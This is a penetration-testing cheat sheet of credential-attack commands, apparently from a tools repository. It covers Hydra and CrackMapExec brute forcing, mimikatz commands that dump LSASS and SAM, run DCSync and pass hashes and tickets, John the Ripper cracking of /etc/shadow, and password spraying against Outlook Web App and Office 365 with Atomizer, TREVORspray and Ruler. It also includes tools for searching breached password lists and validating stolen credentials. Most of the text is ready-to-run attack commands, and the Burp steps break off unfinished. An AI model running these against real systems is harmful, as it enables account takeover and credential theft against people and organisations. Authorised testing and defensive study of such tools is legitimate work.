# Credential-Tools
Tools utilized to conduct password spraying, brute force attacks, and password cracking


## Brute Force Options

### Hydra  

FTP Brute force Attack

    $ hydra -L usernamelist.txt -P passwordlist.txt ftp://<targetIP> 

Rexec Brute force Attack

    $ hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V 

Rlogin Brute force Attack
  
    $ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V 

Rsh Brute force Attack

    $ hydra -L <Username_list> rsh://<Victim_IP> -v -V 

### NetExec (NXC) 

Winrm Brute force Attack

    $ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt 

## Password Capturing Options

### MimiKatz
It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.

References: 
- https://adsecurity.org/?page_id=1821
- https://github.com/gentilkiwi/mimikatz

Dump LSASS

    mimikatz privilege::debug
    mimikatz token::elevate
    mimikatz sekurlsa::logonpasswords
    sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
    mimikatz sekurlsa::minidump c:\temp\lsass.dmp
    
Sump SAM Database

    lsadump::sam
    lsadump::secrets
    lsadump::cache
    mimikatz # lsadump::dcsync /domain:<domain> /all /csv

(Over) Pass The Hash

    mimikatz privilege::debug
    mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN> 

List all available kerberos tickets in memory

    mimikatz sekurlsa::tickets 

Dump local Terminal Services credentials

    mimikatz sekurlsa::tspkg

Pass The Ticket

    mimikatz kerberos::ptt <PathToKirbiFile> 

### Pcredz  

Run Command 

    $ cd /opt/Pcredz
    $ sudo pipenv run python Pcredz 

Collect Creds in Wireshark and Parsing through 

    $ sudo pipenv run python Pcredz –f  /WiresharkScan.pcap
Copy SessionLog file before reading from the wireshark capture. 

## Password Cracking

### Kerberoast from Empire to Hashcat
Using Notepad++, do the following to convert hashes to a format that Hashcat can accept:
    
    Find "$krb" and replace with "|$krb"
    Edit --> Blank Operations --> Trim Leading and Trailing Space
    Select Everything and do a find and replace. Search for "\r\n" and replace with nothing
    Search for "|" and replace with "\r\n" 

### John the Ripper 

    $ john --single hashes-3.des.txt
    $ john --wordlist=password.lst hashes-3.des.txt
    $ john --incremental hashes-3.des.txt
    $ john --format:descrypt --wordlist=crackstation-human-only.txt --rules hashes-3.des.txt
    
Crack /etc/shadow File

    $ sudo /usr/sbin/unshadow /etc/passwd.txt /etc/shadow.txt > /tmp/unshadowed.txt
    $ john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.txt
    $ john --show unshadowed.txt

Check Password Cracking Progress 
Open a separate terminal and run:
    
    $ john --status

Reference: https://www.tunnelsup.com/getting-started-cracking-password-hashes/

## Password Spraying


### Burp Password Spraying 

  1. Open Burp Suite
  2. Select Template
  3. Leave on "Use options saved with project", Select "Start Burp"
  4. Open FireFox and navigate to site that has the login information you want to target.
      For Username - 1username1
      For password - 1password1
  
  5. Open Burp, navigate to the Proxy tab,  
  6. Open the HTTP History
  7. Click on the # (far left Column) to sort the numbers and bring the latest session to the top of the list.
  8. Select the "POST Response" URL that shows 1username1 and 1password1 in the RAW box.
  9. Right click URL and select "Send to Intruder"
  10. Go to "Intruder" tab and 

References:
- https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/
- https://support.portswigger.net/customer/portal/articles/1964020-using-burp-to-brute-force-a-login-page

## Atomizer - Spraying Toolkit

$ sudo atomizer <lync/owa/imap> <target IP> <password> 

 

Examples 

./atomizer.py owa contoso.com 'Fall2018' emails.txt 

./atomizer.py lync contoso.com 'Fall2018' emails.txt 

./atomizer lync contoso.com --csvfile accounts.csv 

./atomizer lync contoso.com --user-as-pass usernames.txt 

./atomizer owa 'https://owa.contoso.com/autodiscover/autodiscover.xml' --recon 

./atomizer.py owa contoso.com passwords.txt emails.txt -i 0:45:00 --gchat <GCHAT_WEBHOOK_URL> 

TREVORSpray 

Initial Install

$ pip install git+https://github.com/blacklanternsecurity/trevorproxy


Enumerate users via OneDrive: 

$ trevorspray --recon <Target Domain> -u emails.txt --threads 10 

TREVORspray is a modular password sprayer with threading, SSH proxying, loot modules, and more! 

msol (Office 365) 

adfs (Active Directory Federation Services) 

owa (Outlook Web App) 

okta (Okta SSO) 

anyconnect (Cisco VPN) 

custom modules (easy to make!) 

https://github.com/blacklanternsecurity/TREVORspray 

Ruler 

ruler -k --domain <Target Domain> brute --users users --passwords passwords --verbose 

 

 




## Additional Tools

### Cewl
Will create a customized wordlist from specified URL (custom wordlist generator).

Reference: https://github.com/digininja/CeWL.git

  Initial Install

    $ sudo git clone https://github.com/digininja/CeWL.git
    $ cd CeWL
    $ sudo bundle install

  Create wordlist from URL

    $ sudo cewl -o <Target_URL> 

  Create wordlist & output data into a file: 

    $ sudo cewl -m 4 -w dict.txt http://<Target_URL>

### Breach-Parse
A tool for parsing breached passwords

Initial Install 

    $ cd /opt
    $ sudo git clone https://github.com/hmaverickadams/breach-parse.git

If you don't store the password list (BreachCompilation) in /opt/breach-parse, specify the location like:

    $ ./breach-parse.sh @gmail.com gmail.txt "~/Downloads/BreachCompilation/data"

Run 

    $ sudo ./breach-pare.sh

### Sort Collected Credentials

Search for overall Local Password Re-use

    $ cat <Samhashes>.txt | sort |uniq -c | sort -nr 

Search for Local Administrator Password Re-Use

    $ cat <Samhashes>.txt | sort |uniq -c | sort -nr | grep ":500"

#### CredNinja   
A multithreaded tool designed to identify if credentials are valid, invalid, or local admin valid credentials within a network at-scale via SMB, plus now with a user hunter.

Reference: https://github.com/Raikia/CredNinja

    PS C:\Tools\CredNinja > CredNinja.py -a accounts_to_test.txt -s systems_to_test.txt
    
           [-t THREADS] [--ntlm] [--valid] [--invalid] [-o OUTPUT] [-p PASSDELIMITER] [--delay SECONDS %JITTER] [--timeout TIMEOUT] [--stripe] [--scan]
           [--scan-timeout SCAN_TIMEOUT] [-h] [--no-color] [--os] [--domain] [--users] [--users-time USERS_TIME] 
